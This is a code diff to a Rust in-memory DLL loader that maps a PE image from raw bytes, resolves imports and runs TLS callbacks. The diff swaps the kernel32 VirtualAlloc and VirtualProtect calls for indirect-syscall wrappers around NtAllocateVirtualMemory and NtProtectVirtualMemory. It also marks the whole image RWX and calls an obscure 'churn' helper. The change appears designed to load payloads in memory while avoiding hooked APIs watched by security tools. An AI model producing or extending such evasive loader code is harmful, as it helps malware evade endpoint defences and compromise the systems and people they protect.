@@ -90,21 +90,16 @@ struct RuntimeFunction {
     _unwind: u32,
 }
 
-// --- WinAPI FFI ---
+// --- WinAPI FFI (import resolution + exception tables only) ---
 
 #[link(name = "kernel32")]
 extern "system" {
-    fn VirtualAlloc(addr: *const c_void, size: usize, alloc_type: u32, protect: u32) -> *mut c_void;
-    fn VirtualFree(addr: *mut c_void, size: usize, free_type: u32) -> i32;
-    fn VirtualProtect(addr: *const c_void, size: usize, new_protect: u32, old_protect: *mut u32) -> i32;
     fn LoadLibraryA(name: *const u8) -> *mut c_void;
     fn GetProcAddress(module: *mut c_void, name: *const u8) -> *mut c_void;
     fn RtlAddFunctionTable(table: *const RuntimeFunction, count: u32, base: u64) -> u8;
     fn RtlDeleteFunctionTable(table: *const RuntimeFunction) -> u8;
 }
 
-const MEM_COMMIT: u32 = 0x1000;
-const MEM_RESERVE: u32 = 0x2000;
 const PAGE_READWRITE: u32 = 0x04;
 const PAGE_EXECUTE_READWRITE: u32 = 0x40;
 
@@ -213,12 +208,11 @@ pub unsafe fn load(dll_bytes: &[u8]) -> Result<MappedModule, &'static str> {
 
     let sec_start = file_hdr + 20 + size_of_opt_hdr;
 
-    // Allocate
-    let base = VirtualAlloc(ptr::null(), size_of_image, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if base.is_null() {
-        return Err("VirtualAlloc failed");
-    }
-    let base = base as *mut u8;
+    // Allocate via indirect syscall (NtAllocateVirtualMemory)
+    let base = match crate::nt_mem::allocate(size_of_image, PAGE_READWRITE) {
+        Some(b) => b,
+        None => return Err("NtAllocateVirtualMemory failed"),
+    };
 
     crate::helpers::churn(&size_of_image.to_ne_bytes());
 
@@ -382,8 +376,9 @@ pub unsafe fn load(dll_bytes: &[u8]) -> Result<MappedModule, &'static str> {
     }
 
     // Set section permissions — RWX for all to allow CRT lazy init
-    let mut old: u32 = 0;
-    VirtualProtect(base as *const c_void, size_of_image, PAGE_EXECUTE_READWRITE, &mut old);
+    if !crate::nt_mem::protect(base, size_of_image, PAGE_EXECUTE_READWRITE) {
+        return Err("NtProtectVirtualMemory failed");
+    }
 
     // Process TLS callbacks (data dir index 9)
     if num_data_dirs > 9 {
